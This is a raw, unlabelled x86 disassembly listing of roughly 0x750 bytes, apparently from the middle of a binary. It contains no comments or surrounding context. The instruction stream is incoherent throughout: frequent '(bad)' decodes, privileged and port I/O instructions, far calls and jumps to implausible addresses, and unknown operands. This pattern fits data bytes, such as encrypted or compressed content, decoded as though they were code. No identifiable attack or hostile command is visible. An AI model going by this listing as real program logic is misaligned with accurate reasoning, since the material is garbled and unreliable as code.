  41dc08:	into   
  41dc09:	mov    ebx,0x83ad34e8
  41dc0e:	fs rcl dl,cl
  41dc11:	cmp    dl,0x3f
  41dc14:	sbb    bl,al
  41dc16:	push   esi
  41dc17:	mov    ebp,0xf96002e1
  41dc1c:	adc    al,0x2a
  41dc1e:	xlat   BYTE PTR ds:[ebx]
  41dc1f:	and    edx,ebp
  41dc21:	pop    ds
  41dc22:	push   esi
  41dc23:	jbe    0x41dc0c
  41dc25:	pop    ds
  41dc26:	mov    esp,0xbdf7544
  41dc2b:	mov    edx,0x84ac3cd7
  41dc30:	fwait
  41dc31:	popf   
  41dc32:	inc    ebx
  41dc33:	cmp    BYTE PTR [eax],cl
  41dc35:	push   ebx
  41dc36:	push   cs
  41dc37:	inc    esp
  41dc38:	arpl   si,si
  41dc3a:	inc    ecx
  41dc3b:	out    dx,al
  41dc3c:	inc    ebx
  41dc3d:	pusha  
  41dc3e:	mov    ch,0xfa
  41dc40:	pop    ecx
  41dc41:	and    al,0x2f
  41dc43:	add    DWORD PTR [ecx-0x13],ecx
  41dc46:	adc    BYTE PTR [ebx-0x70],bl
  41dc49:	fs je  0x41dbd3
  41dc4c:	pop    edx
  41dc4d:	pop    es
  41dc4e:	add    dh,BYTE PTR [ecx]
  41dc50:	adc    eax,0xc3cc683c
  41dc55:	clc    
  41dc56:	rol    DWORD PTR [esi+edx*8],cl
  41dc59:	or     bl,al
  41dc5b:	daa    
  41dc5c:	cmp    dl,ah
  41dc5e:	xchg   ebx,eax
  41dc5f:	mov    ds:0xbfa5684f,eax
  41dc64:	dec    edi
  41dc65:	pop    edx
  41dc66:	pushf  
  41dc67:	in     al,0x6
  41dc69:	mov    WORD PTR [eax-0x4811e8ae],?
  41dc6f:	jmp    0x92cd327e
  41dc74:	stos   BYTE PTR es:[edi],al
  41dc75:	ss pusha 
  41dc77:	cmp    edx,DWORD PTR [eax+esi*2-0xe]
  41dc7b:	xor    ebx,DWORD PTR [edi]
  41dc7d:	lock xor eax,0xcec2fe4b
  41dc83:	xor    DWORD PTR [ecx+0x75c4598b],0x62605aec
  41dc8d:	jo     0x41dcce
  41dc8f:	scas   eax,DWORD PTR es:[edi]
  41dc90:	push   es
  41dc91:	hlt    
  41dc92:	test   BYTE PTR [eax+0x2d],0x97
  41dc96:	rol    DWORD PTR [edi+0x44],0x58
  41dc9a:	es retf 
  41dc9c:	sar    DWORD PTR [eax+ebx*2],cl
  41dc9f:	int    0x7c
  41dca1:	stos   BYTE PTR es:[edi],al
  41dca2:	ins    DWORD PTR es:[edi],dx
  41dca3:	scas   eax,DWORD PTR es:[edi]
  41dca4:	addr16 jge 0x41dc90
  41dca7:	add    DWORD PTR [ecx+0x1b],esi
  41dcaa:	and    eax,DWORD PTR [edx+0x1e]
  41dcad:	push   ecx
  41dcae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcaf:	inc    ebp
  41dcb0:	mov    ecx,0x20734ce1
  41dcb5:	adc    DWORD PTR [edx+0x3b2f4e0c],0xffffff82
  41dcbc:	lods   al,BYTE PTR ds:[esi]
  41dcbd:	jl     0x41dd26
  41dcbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcc0:	addr16 das 
  41dcc2:	fstp   DWORD PTR [eax]
  41dcc4:	mov    al,0x8c
  41dcc6:	xchg   esp,eax
  41dcc7:	aas    
  41dcc8:	shl    BYTE PTR [edi+0x30],1
  41dccb:	mov    DWORD PTR [ecx+0x37cfacb2],ebx
  41dcd1:	xchg   edx,eax
  41dcd2:	icebp  
  41dcd3:	pop    ss
  41dcd4:	(bad)  
  41dcd6:	in     al,0x3a
  41dcd8:	jne    0x41dc68
  41dcda:	stc    
  41dcdb:	push   ebp
  41dcdc:	daa    
  41dcdd:	xor    ecx,DWORD PTR [ecx]
  41dcdf:	push   ss
  41dce0:	adc    BYTE PTR [edi+0xf],al
  41dce3:	stos   BYTE PTR es:[edi],al
  41dce4:	and    BYTE PTR [edx+edi*4+0x5c8c772],al
  41dceb:	sub    edx,esi
  41dced:	xor    DWORD PTR [ecx+0x5ff0e318],ecx
  41dcf3:	int3   
  41dcf4:	dec    esi
  41dcf5:	(bad)  
  41dcf6:	fst    QWORD PTR [edi]
  41dcf8:	sti    
  41dcf9:	outs   dx,BYTE PTR ds:[esi]
  41dcfa:	jo     0x41dc83
  41dcfc:	adc    ecx,DWORD PTR ds:0x3cc25dfa
  41dd02:	sub    cl,bh
  41dd04:	clc    
  41dd05:	cmp    cl,dl
  41dd07:	mov    ebp,DWORD PTR [ecx]
  41dd09:	repnz cmp DWORD PTR [edx-0x4a7d5312],ebx
  41dd10:	sbb    ebx,DWORD PTR [edi-0x80]
  41dd13:	(bad)  
  41dd14:	pop    ebp
  41dd15:	xchg   esi,eax
  41dd16:	ds sub eax,0xaebf9a3a
  41dd1c:	xchg   edx,eax
  41dd1d:	imul   esp,DWORD PTR [ebp+esi*4-0x2bb7da29],0xfe87e41d
  41dd28:	add    BYTE PTR [edx],cl
  41dd2a:	(bad)  
  41dd2c:	push   0x40
  41dd2e:	xchg   edi,eax
  41dd2f:	retf   0x685
  41dd32:	sbb    BYTE PTR [edi+0x71],0x11
  41dd36:	sar    esp,1
  41dd38:	lds    esi,FWORD PTR gs:[edi]
  41dd3b:	and    al,0x7c
  41dd3d:	mov    ebp,0x526d8291
  41dd42:	adc    DWORD PTR [ebx+0x1562a59c],ecx
  41dd48:	add    ah,BYTE PTR [edi]
  41dd4a:	adc    eax,0x5dcfac24
  41dd4f:	sub    BYTE PTR [esi+0x40dc116a],bh
  41dd55:	mov    al,ds:0xec274574
  41dd5a:	adc    BYTE PTR [esi-0x6d546549],cl
  41dd60:	xlat   BYTE PTR fs:[ebx]
  41dd62:	cmp    ebp,edx
  41dd64:	loope  0x41dcf7
  41dd66:	(bad)  
  41dd67:	push   edi
  41dd68:	mov    ah,0xa2
  41dd6a:	adc    BYTE PTR [eax-0x5e550bef],ah
  41dd70:	inc    esp
  41dd71:	sbb    dh,ch
  41dd73:	dec    ecx
  41dd74:	enter  0x4d3f,0xc2
  41dd78:	mov    esp,0xd95d7e7a
  41dd7d:	fimul  WORD PTR [edi]
  41dd7f:	dec    edi
  41dd80:	jbe    0x41dde0
  41dd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd83:	cmp    DWORD PTR [ebp-0x69],esp
  41dd86:	jb     0xc03c868e
  41dd8c:	cld    
  41dd8d:	mov    ebx,0x4b85caf5
  41dd92:	call   0xc3ff8c93
  41dd97:	scas   al,BYTE PTR es:[edi]
  41dd98:	js     0x41dd8b
  41dd9a:	and    esp,DWORD PTR [edi-0x7c]
  41dd9d:	jmp    0x41dd73
  41dd9f:	daa    
  41dda0:	xchg   edx,eax
  41dda1:	sub    cl,cl
  41dda3:	jno    0x41dd6f
  41dda5:	arpl   bx,si
  41dda7:	jne    0x41dd6a
  41dda9:	loop   0x41dd3a
  41ddab:	xor    BYTE PTR ds:0xbbbe5d83,dh
  41ddb1:	dec    esp
  41ddb2:	jb     0x41dd8d
  41ddb4:	jnp    0x41dd6e
  41ddb6:	sub    bl,dl
  41ddb8:	mov    bl,0xeb
  41ddba:	jp     0x41dda0
  41ddbc:	fld    TBYTE PTR [ebx+0x234e898f]
  41ddc2:	pop    es
  41ddc3:	stos   BYTE PTR es:[edi],al
  41ddc4:	pop    edi
  41ddc5:	or     bh,BYTE PTR [edi]
  41ddc7:	mov    BYTE PTR [esi+0x514bbe66],ch
  41ddcd:	je     0x41ddbe
  41ddcf:	repnz std 
  41ddd1:	stos   DWORD PTR es:[edi],eax
  41ddd2:	pop    edi
  41ddd3:	jb     0x41de3d
  41ddd5:	ss sahf 
  41ddd7:	push   0x52
  41ddd9:	out    dx,eax
  41ddda:	cmp    DWORD PTR [ebx-0xbb7983d],esi
  41dde0:	daa    
  41dde1:	or     BYTE PTR [edx],bl
  41dde3:	inc    ebp
  41dde4:	pop    ecx
  41dde5:	jnp    0x41de42
  41dde7:	xchg   esp,eax
  41dde8:	mov    dh,bh
  41ddea:	(bad)  
  41ddeb:	fsubr  QWORD PTR [ebx-0xd]
  41ddee:	call   0x970b8ffc
  41ddf3:	jg     0x41ddc2
  41ddf5:	add    dl,BYTE PTR [edx]
  41ddf7:	push   ebp
  41ddf8:	test   ebp,eax
  41ddfa:	adc    dh,ch
  41ddfc:	adc    DWORD PTR [edx-0x44],edx
  41ddff:	push   cs
  41de00:	and    al,0x87
  41de02:	or     bh,BYTE PTR [edx-0x68]
  41de05:	sbb    eax,0x7d1c0f3
  41de0a:	call   0x1add:0xc05ba495
  41de11:	into   
  41de12:	fcom   QWORD PTR [ebx]
  41de14:	ret    0x97f3
  41de17:	cs mov esi,0xfa1cc5fa
  41de1d:	ret    0xaaed
  41de20:	into   
  41de21:	cmp    BYTE PTR [ebx-0xf8e9215],al
  41de27:	scas   eax,DWORD PTR es:[edi]
  41de28:	sbb    eax,edi
  41de2a:	and    eax,0x4ded1b41
  41de2f:	mov    WORD PTR ds:0x66645d64,fs
  41de35:	sub    DWORD PTR [ecx],edi
  41de37:	call   0x24c6d0e3
  41de3c:	pop    ebx
  41de3d:	out    dx,al
  41de3e:	xchg   esi,eax
  41de3f:	ror    DWORD PTR [ecx],1
  41de41:	ja     0x41ddc5
  41de43:	je     0x41de1d
  41de45:	sub    al,0xf3
  41de47:	iret   
  41de48:	aas    
  41de49:	jbe    0x41dde3
  41de4b:	out    0x8c,al
  41de4d:	cmp    al,0xf3
  41de4f:	pop    edx
  41de50:	pop    esp
  41de51:	mov    al,ds:0xc331c81e
  41de56:	inc    ecx
  41de57:	mov    bl,bl
  41de59:	inc    ebx
  41de5a:	aas    
  41de5b:	lods   al,BYTE PTR ds:[esi]
  41de5c:	test   al,0xa6
  41de5e:	leave  
  41de5f:	jbe    0x41de3a
  41de61:	int    0xf
  41de63:	sbb    DWORD PTR [edi-0x5d436594],ebp
  41de69:	(bad)  
  41de6b:	aaa    
  41de6c:	or     bh,bh
  41de6e:	and    ebp,ebx
  41de70:	ss push ebp
  41de72:	sub    al,bl
  41de74:	and    BYTE PTR [ecx-0x4],0x2e
  41de78:	xchg   esp,eax
  41de79:	ins    BYTE PTR es:[edi],dx
  41de7a:	push   ecx
  41de7b:	inc    ebx
  41de7c:	jmp    0x29fcdb12
  41de81:	sbb    DWORD PTR [esi-0x7f],ebx
  41de84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de85:	iret   
  41de86:	clc    
  41de87:	fsub   QWORD PTR [eax-0x78]
  41de8a:	cli    
  41de8b:	fidiv  DWORD PTR [eax]
  41de8d:	into   
  41de8e:	mov    ah,0xc2
  41de90:	adc    DWORD PTR [ecx],ebx
  41de92:	inc    ecx
  41de93:	adc    eax,ebx
  41de95:	loopne 0x41deae
  41de97:	inc    edx
  41de98:	sbb    ebx,ecx
  41de9a:	jg     0x41dedc
  41de9c:	cld    
  41de9d:	ja     0x41de64
  41de9f:	movq   mm7,mm7
  41dea2:	sub    al,0x4d
  41dea4:	and    DWORD PTR [edx+0x6c3b40e5],eax
  41deaa:	ins    DWORD PTR es:[edi],dx
  41deab:	cmp    ch,0xd2
  41deae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41deaf:	mov    ds:0xa3f3f6f5,eax
  41deb4:	push   es
  41deb5:	jb     0x41deff
  41deb7:	mov    edi,0x43a243a
  41debc:	cmovo  ebp,DWORD PTR [eax]
  41debf:	dec    eax
  41dec0:	das    
  41dec1:	jmp    0x700edfa
  41dec6:	int    0x62
  41dec8:	stos   BYTE PTR es:[edi],al
  41dec9:	sbb    eax,0xdd4829f2
  41dece:	cwde   
  41decf:	packsswb mm2,QWORD PTR [bp+si]
  41ded3:	icebp  
  41ded4:	rol    ah,1
  41ded6:	mov    dh,0xc5
  41ded8:	inc    edx
  41ded9:	and    ebp,eax
  41dedb:	dec    esp
  41dedc:	stos   DWORD PTR es:[edi],eax
  41dedd:	push   ss
  41dede:	adc    BYTE PTR [eax-0xe],0xb1
  41dee2:	mov    ebx,0xe7bc32d9
  41dee7:	jnp    0x41de89
  41dee9:	pop    eax
  41deea:	je     0x41def6
  41deec:	push   esp
  41deed:	lock push edi
  41deef:	daa    
  41def0:	call   FWORD PTR [ecx-0x7b69056f]
  41def6:	fs dec ecx
  41def8:	ins    DWORD PTR es:[edi],dx
  41def9:	mov    ebp,0x2b91de87
  41defe:	push   edx
  41deff:	icebp  
  41df00:	mov    eax,ds:0xb70ad599
  41df05:	fs test eax,esi
  41df08:	mov    cl,0xcb
  41df0a:	ins    BYTE PTR es:[edi],dx
  41df0b:	adc    bh,al
  41df0d:	(bad)  
  41df0e:	shl    ch,cl
  41df10:	es mov bh,0x19
  41df13:	addr16 mov edx,0xbaf2df87
  41df19:	push   edi
  41df1a:	out    0x9c,eax
  41df1c:	xor    ecx,DWORD PTR ds:0xf9bc35d4
  41df22:	xor    BYTE PTR [edx+0x2463e9cf],ah
  41df28:	jg     0x41df2e
  41df2a:	out    0x1f,eax
  41df2c:	pop    esp
  41df2d:	dec    esi
  41df2e:	not    DWORD PTR [eax]
  41df30:	pop    ecx
  41df31:	outs   dx,BYTE PTR ds:[esi]
  41df32:	out    dx,eax
  41df33:	mov    gs,ebx
  41df35:	or     DWORD PTR [edx-0x5b],edx
  41df38:	jne    0x41df86
  41df3a:	xchg   ecx,eax
  41df3b:	popf   
  41df3c:	mov    cl,0x5c
  41df3e:	dec    ebp
  41df3f:	xchg   ebp,eax
  41df40:	ror    BYTE PTR [ebp+0x5ecdfc86],1
  41df46:	call   0xb9e89abe
  41df4b:	or     ebp,DWORD PTR ds:[ebx]
  41df4e:	jno    0x41df91
  41df50:	mov    dl,0x2e
  41df52:	ror    BYTE PTR [eax+0x278f4a08],0x1e
  41df59:	inc    esi
  41df5a:	mov    ds:0x7c84616c,eax
  41df5f:	mov    WORD PTR [edi+0x19],fs
  41df62:	test   al,0xb6
  41df64:	push   ecx
  41df65:	(bad)  
  41df66:	jns    0x41df4e
  41df68:	pop    edi
  41df69:	mov    ebx,0x16f4758f
  41df6e:	jo     0x41df44
  41df70:	xor    DWORD PTR [edi+0x3ba6ac9c],ebx
  41df76:	jne    0x41df36
  41df78:	sub    ebp,DWORD PTR [esi]
  41df7a:	dec    edi
  41df7b:	test   al,0x54
  41df7d:	jb     0x41df00
  41df7f:	(bad)  
  41df80:	js     0x41dfa2
  41df82:	xchg   ebp,eax
  41df83:	shl    DWORD PTR [ebp+0x3a],cl
  41df86:	out    0x74,eax
  41df88:	aad    0xab
  41df8a:	scas   eax,DWORD PTR es:[edi]
  41df8b:	cmp    BYTE PTR [eax-0x3b],ch
  41df8e:	out    dx,eax
  41df8f:	mov    BYTE PTR [edx+0x5b],0x88
  41df93:	popa   
  41df94:	sub    ecx,DWORD PTR [edi-0x4b51d292]
  41df9a:	dec    ebp
  41df9b:	jg     0x41df7f
  41df9d:	xchg   ebp,eax
  41df9e:	repz test DWORD PTR [esi+0x10b1766],esp
  41dfa5:	cmp    al,0x5a
  41dfa7:	out    dx,eax
  41dfa8:	xor    al,0xb2
  41dfaa:	mov    al,0x60
  41dfac:	dec    edi
  41dfad:	push   esi
  41dfae:	mov    edx,0xd0e4705
  41dfb3:	aas    
  41dfb4:	into   
  41dfb5:	fwait
  41dfb6:	xor    ecx,edi
  41dfb8:	dec    ebp
  41dfb9:	push   edi
  41dfba:	arpl   WORD PTR [edi+0x2],ax
  41dfbd:	sbb    DWORD PTR [ecx-0x2a326c7],ebx
  41dfc3:	dec    esp
  41dfc4:	and    ebx,DWORD PTR [eax]
  41dfc6:	rcr    DWORD PTR [eax+ecx*1-0x38],cl
  41dfca:	das    
  41dfcb:	cmp    BYTE PTR [ebx+0x4503de97],dh
  41dfd1:	push   0xffffffef
  41dfd3:	out    dx,eax
  41dfd4:	pusha  
  41dfd5:	rcl    BYTE PTR ds:[eax-0x3fe18baa],1
  41dfdc:	dec    edi
  41dfdd:	and    dh,BYTE PTR [eax]
  41dfdf:	mov    dh,BYTE PTR [ebx*8-0x59f152b5]
  41dfe6:	repz jno 0x41dfe9
  41dfe9:	jmp    0x493fbca9
  41dfee:	ds pop eax
  41dff0:	push   es
  41dff1:	sub    DWORD PTR [eax+0x43],ebp
  41dff4:	es jp  0x41e05d
  41dff7:	adc    ebx,DWORD PTR [eax-0x2d]
  41dffa:	pop    esi
  41dffb:	sub    edx,DWORD PTR [edi-0x368accce]
  41e001:	(bad)  
  41e002:	call   FWORD PTR [edx+edi*2-0x4a]
  41e006:	add    al,BYTE PTR [ebx+0xc6f7eaa]
  41e00c:	stos   DWORD PTR es:[edi],eax
  41e00d:	add    eax,0x980a88
  41e012:	ret    
  41e013:	call   0x64b1d44
  41e018:	loop   0x41e01a
  41e01a:	je     0x41e021
  41e01c:	enter  0xef69,0x19
  41e020:	mov    fs,WORD PTR [edi-0x19efa9ea]
  41e026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e027:	les    edx,FWORD PTR [edx-0x48ed8deb]
  41e02d:	dec    esi
  41e02e:	call   0xa9584341
  41e033:	inc    edx
  41e034:	adc    al,0x9a
  41e036:	jmp    FWORD PTR [eax+0x50fc01e3]
  41e03c:	sbb    eax,0x54b5395d
  41e041:	pop    ebp
  41e042:	call   0xfbcf:0x36338450
  41e049:	(bad)  
  41e04a:	and    eax,0x8498710
  41e04f:	or     BYTE PTR [edx-0x22],bl
  41e052:	std    
  41e053:	in     al,0x70
  41e055:	pop    edx
  41e056:	push   ebx
  41e057:	scas   eax,DWORD PTR es:[edi]
  41e058:	icebp  
  41e059:	xor    al,0xbf
  41e05b:	mov    bl,0x16
  41e05d:	int    0xd
  41e05f:	imul   ebx,DWORD PTR ds:0xf5871bb1,0xffffff90
  41e066:	stos   DWORD PTR es:[edi],eax
  41e067:	in     al,0xca
  41e069:	mov    bh,0x7
  41e06b:	int    0x7d
  41e06d:	fidivr DWORD PTR [si-0x2853]
  41e072:	clc    
  41e073:	jb     0x41e0ca
  41e075:	loop   0x41e020
  41e077:	outs   dx,BYTE PTR ds:[esi]
  41e078:	xor    eax,DWORD PTR [ebp+0x5e6c967e]
  41e07e:	push   ecx
  41e07f:	fld    QWORD PTR [esi-0x31]
  41e082:	outs   dx,BYTE PTR ds:[esi]
  41e083:	fs enter 0x7e02,0x6e
  41e088:	ds push ecx
  41e08a:	cmc    
  41e08b:	adc    eax,0xae43f5d
  41e090:	sbb    DWORD PTR [esp+esi*2-0x620d33ca],0xffffffb7
  41e098:	jmp    0x41e087
  41e09a:	ficomp WORD PTR [edx]
  41e09c:	lds    ebp,FWORD PTR [ebx+0xa3dab24]
  41e0a2:	jmp    0x96093b7f
  41e0a7:	push   0xffffffb0
  41e0a9:	mov    ah,dl
  41e0ab:	outs   dx,DWORD PTR ds:[esi]
  41e0ac:	iret   
  41e0ad:	sbb    eax,edx
  41e0af:	and    al,0xd4
  41e0b1:	cmp    ch,BYTE PTR ds:[eax-0x4fe03588]
  41e0b8:	int3   
  41e0b9:	xchg   BYTE PTR [eax-0xe4360d],bl
  41e0bf:	aas    
  41e0c0:	xor    dl,0x1a
  41e0c3:	call   0x742c991f
  41e0c8:	mov    edx,0xbbfb2269
  41e0cd:	in     al,0xba
  41e0cf:	push   es
  41e0d0:	jmp    0x41e149
  41e0d2:	xchg   esi,eax
  41e0d3:	call   0x15322c4a
  41e0d8:	gs xchg esp,eax
  41e0da:	cmp    DWORD PTR [ecx],ebp
  41e0dc:	enter  0xcb29,0x81
  41e0e0:	fist   DWORD PTR [ebx-0x4]
  41e0e3:	xchg   ebp,eax
  41e0e4:	jge    0x41e0b2
  41e0e6:	sar    BYTE PTR [edx],cl
  41e0e8:	hlt    
  41e0e9:	push   ecx
  41e0ea:	mov    dh,0x2
  41e0ec:	inc    edi
  41e0ed:	xchg   ecx,eax
  41e0ee:	add    ch,cl
  41e0f0:	out    0xd5,eax
  41e0f2:	fisub  DWORD PTR [eax-0x38]
  41e0f5:	sar    DWORD PTR [edi-0x5c],1
  41e0f8:	push   cs
  41e0f9:	daa    
  41e0fa:	(bad)  [ecx-0x33]
  41e0fd:	sub    ebp,0xffffffcd
  41e100:	stos   DWORD PTR es:[edi],eax
  41e101:	inc    edx
  41e102:	clc    
  41e103:	pop    es
  41e104:	push   eax
  41e105:	push   edx
  41e106:	repnz dec esp
  41e108:	outs   dx,DWORD PTR ds:[esi]
  41e109:	mov    ah,0x8
  41e10b:	or     eax,DWORD PTR [edi-0xe]
  41e10e:	inc    ecx
  41e10f:	mov    dh,0xed
  41e111:	imul   ebp,edx,0x4a
  41e114:	xlat   BYTE PTR ds:[ebx]
  41e115:	xchg   ebp,eax
  41e116:	ficomp DWORD PTR [ecx+0x57]
  41e119:	add    eax,0x1540482e
  41e11e:	or     DWORD PTR ds:0x28eb423a,0xc0897c0b
  41e128:	outs   dx,DWORD PTR ds:[esi]
  41e129:	ds jae 0x41e0cd
  41e12c:	enter  0x6567,0x7f
  41e130:	xor    DWORD PTR [ebp+0x3747a04f],esp
  41e136:	xacquire xchg BYTE PTR [edx-0xe],bh
  41e13a:	out    0x46,eax
  41e13c:	lock and eax,ebx
  41e13f:	cmp    eax,0x8090105e
  41e144:	out    0x7e,al
  41e146:	pop    esi
  41e147:	mov    eax,0x4d9896fa
  41e14c:	push   esi
  41e14d:	mov    eax,ds:0xd092635c
  41e152:	adc    bh,bl
  41e154:	or     dl,BYTE PTR [esi+0x3e]
  41e157:	rcl    DWORD PTR [eax+0x1337a0db],1
  41e15d:	push   eax
  41e15e:	inc    esp
  41e15f:	sub    ebx,DWORD PTR [ecx-0x41]
  41e162:	push   esi
  41e163:	add    ch,BYTE PTR [ebp-0x5999ccf8]
  41e169:	inc    ebx
  41e16a:	pop    esp
  41e16b:	cmp    BYTE PTR [edx-0x38],cl
  41e16e:	test   DWORD PTR [edi+0x5f],esi
  41e171:	js     0x41e10a
  41e173:	fild   QWORD PTR [ebp+0x75]
  41e176:	mov    dl,0x35
  41e178:	add    bl,BYTE PTR [bx-0x7e23]
  41e17d:	mov    al,0x49
  41e17f:	push   ds
  41e180:	xor    ch,cl
  41e182:	xchg   edx,eax
  41e183:	enter  0xd7a0,0x62
  41e187:	lahf   
  41e188:	push   ss
  41e189:	sbb    BYTE PTR [edi+ecx*1],ah
  41e18c:	push   ebp
  41e18d:	and    DWORD PTR ds:[ecx-0x8],edx
  41e191:	lods   al,BYTE PTR ds:[esi]
  41e192:	push   esp
  41e193:	ficom  DWORD PTR [ebx+0x12]
  41e196:	ds enter 0xdb08,0x1a
  41e19b:	pop    eax
  41e19c:	mov    dh,0xbb
  41e19e:	mov    dl,0x12
  41e1a0:	add    al,0xa3
  41e1a2:	ins    DWORD PTR es:[edi],dx
  41e1a3:	inc    edx
  41e1a4:	cwde   
  41e1a5:	push   ecx
  41e1a6:	leave  
  41e1a7:	jnp    0x41e21e
  41e1a9:	mov    fs:0xccf5568e,eax
  41e1af:	lods   al,BYTE PTR ds:[esi]
  41e1b0:	or     al,0xf7
  41e1b2:	(bad)  
  41e1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1b4:	outs   dx,DWORD PTR ds:[esi]
  41e1b5:	jnp    0x41e213
  41e1b7:	adc    BYTE PTR [ecx],dh
  41e1b9:	rol    DWORD PTR [ebp+0x3e],0x57
  41e1bd:	or     BYTE PTR [ebx],dh
  41e1bf:	fbstp  TBYTE PTR [ebx+0x4440b769]
  41e1c5:	(bad)  
  41e1c6:	in     eax,dx
  41e1c7:	jl     0x41e1aa
  41e1c9:	loop   0x41e1f6
  41e1cb:	out    dx,al
  41e1cc:	mov    edx,0x5bbd4b7
  41e1d1:	xchg   ebx,eax
  41e1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d3:	jb     0x41e1ff
  41e1d5:	enter  0xb9ff,0xe4
  41e1d9:	inc    edx
  41e1da:	daa    
  41e1db:	adc    eax,0xc73bd7a7
  41e1e0:	mov    al,ds:0xdfbfbd62
  41e1e5:	and    DWORD PTR [ebp+0x49],0xa02751ff
  41e1ec:	dec    eax
  41e1ed:	push   ebp
  41e1ee:	imul   ecx,esp,0xffffffd7
  41e1f1:	ins    BYTE PTR es:[edi],dx
  41e1f2:	cli    
  41e1f3:	mov    ebp,?
  41e1f5:	fiadd  DWORD PTR [eax-0x34afaa76]
  41e1fb:	hlt    
  41e1fc:	mov    bh,BYTE PTR [ebp-0x49]
  41e1ff:	fsubr  QWORD PTR [edx-0x19]
  41e202:	and    eax,0xa4fbdfe6
  41e207:	fld    TBYTE PTR ds:0x27543f57
  41e20d:	xchg   ebx,eax
  41e20e:	xchg   BYTE PTR [eax],ah
  41e210:	jnp    0x41e28c
  41e212:	ins    BYTE PTR es:[edi],dx
  41e213:	add    edi,DWORD PTR [edx]
  41e215:	fwait
  41e216:	test   al,0xd4
  41e218:	add    al,0x69
  41e21a:	mov    ch,0x84
  41e21c:	test   al,0x58
  41e21e:	mov    bh,0x3e
  41e220:	icebp  
  41e221:	jge    0x41e25d
  41e223:	xchg   ebx,eax
  41e224:	push   esi
  41e225:	and    dh,BYTE PTR [eax]
  41e227:	pop    ecx
  41e228:	pushf  
  41e229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e22a:	push   es
  41e22b:	loope  0x41e1d8
  41e22d:	fnsave [eax-0x69003ebd]
  41e233:	and    BYTE PTR [edx+0x3],dh
  41e236:	sbb    DWORD PTR [ecx],ebx
  41e238:	mov    ds:0x3f2a56b7,eax
  41e23d:	out    dx,eax
  41e23e:	fld    QWORD PTR [edx]
  41e240:	hlt    
  41e241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e242:	repnz das 
  41e244:	dec    ebp
  41e245:	call   FWORD PTR [edx]
  41e247:	jmp    0x41e2a9
  41e249:	mul    BYTE PTR [ecx-0x5a761b1]
  41e24f:	sbb    cl,BYTE PTR [ecx+0x31]
  41e252:	(bad)  
  41e253:	xor    eax,0x5cb53355
  41e258:	add    eax,0x956d95dc
  41e25d:	in     al,0xc9
  41e25f:	jecxz  0x41e28e
  41e261:	daa    
  41e262:	sub    DWORD PTR [esi-0x1b],0xcc0e7cbd
  41e269:	popa   
  41e26a:	cmc    
  41e26b:	clc    
  41e26c:	ja     0x41e283
  41e26e:	or     ebp,DWORD PTR [ebx+0x5dfb615f]
  41e274:	pop    ebp
  41e275:	pop    eax
  41e276:	sub    DWORD PTR [eax+0x3d],0x2616d1e3
  41e27d:	nop
  41e27e:	int3   
  41e27f:	adc    eax,0xbbbef608
  41e284:	cli    
  41e285:	sar    DWORD PTR [esi],0xa3
  41e288:	push   0x6f
  41e28a:	out    0xb7,al
  41e28c:	es jg  0x41e244
  41e28f:	in     eax,0x36
  41e291:	in     al,0x5a
  41e293:	sub    al,0x1f
  41e295:	int3   
  41e296:	loopne 0x41e2d3
  41e298:	adc    ah,0xc3
  41e29b:	or     al,0x6f
  41e29d:	ficomp DWORD PTR [ebp-0x4e64fa77]
  41e2a3:	iret   
  41e2a4:	xor    DWORD PTR [esi],ecx
  41e2a6:	pop    edx
  41e2a7:	in     al,0x36
  41e2a9:	dec    esi
  41e2aa:	out    dx,eax
  41e2ab:	and    al,0x8e
  41e2ad:	je     0x41e2f6
  41e2af:	or     ecx,esp
  41e2b1:	xor    eax,0x11bde3f3
  41e2b6:	push   ss
  41e2b7:	xlat   BYTE PTR ds:[ebx]
  41e2b8:	inc    ecx
  41e2b9:	outs   dx,DWORD PTR ds:[esi]
  41e2ba:	xor    DWORD PTR [ecx+ecx*8],eax
  41e2bd:	dec    eax
  41e2be:	aad    0x20
  41e2c0:	mov    ebp,0xc2e5c6b7
  41e2c5:	in     al,0x25
  41e2c7:	(bad)  
  41e2c8:	mov    ds:0x16c23fa3,eax
  41e2cd:	neg    DWORD PTR [esi+0x7232047f]
  41e2d3:	mov    eax,0x65ab08d2
  41e2d8:	add    eax,0x30258a7c
  41e2dd:	js     0x41e32b
  41e2df:	add    al,0xdd
  41e2e1:	xchg   cl,dl
  41e2e3:	arpl   sp,si
  41e2e5:	repz pop esp
  41e2e7:	jmp    0xad7945a8
  41e2ec:	addr16 mov ah,0xb6
  41e2ef:	push   0x96ea2bd6
  41e2f4:	cmp    ch,bh
  41e2f6:	pop    esp
  41e2f7:	loop   0x41e2bd
  41e2f9:	retf   0x69f0
  41e2fc:	jecxz  0x41e2cf
  41e2fe:	add    edx,0x43
  41e301:	pop    eax
  41e302:	adc    eax,0xdfddde72
  41e307:	popf   
  41e308:	loopne 0x41e2ad
  41e30a:	addr16 mov bh,0xa8
  41e30d:	xlat   BYTE PTR ds:[ebx]
  41e30e:	jmp    0xc3f0274c
  41e313:	les    esi,FWORD PTR [edi-0x3edd65f]
  41e319:	repnz sbb al,0x50
  41e31c:	lea    esi,[eax]
  41e31e:	call   0x5a6b76f1
  41e323:	pop    eax
  41e324:	int    0xee
  41e326:	outs   dx,DWORD PTR ds:[esi]
  41e327:	idiv   eax
  41e329:	cmp    eax,0xbdbee4fd
  41e32e:	mov    ecx,0x390a5be3
  41e333:	mov    dh,0xb1
  41e335:	shr    DWORD PTR [edi+edi*4-0x50],0x19
  41e33a:	pop    ss
  41e33b:	pop    ecx
  41e33c:	mov    eax,ds:0xe70ed6ab
  41e341:	add    eax,0xe8058de7
  41e346:	jmp    0x41e363
  41e348:	arpl   WORD PTR [edx],sp
  41e34a:	repz int 0x2e
  41e34d:	stos   BYTE PTR es:[edi],al
  41e34e:	dec    esp
  41e34f:	push   esi
  41e350:	xlat   BYTE PTR ds:[ebx]
  41e351:	push   0x6f1fb1a
  41e356:	jg     0x41e3b5
  41e358:	into   
  41e359:	(bad)  
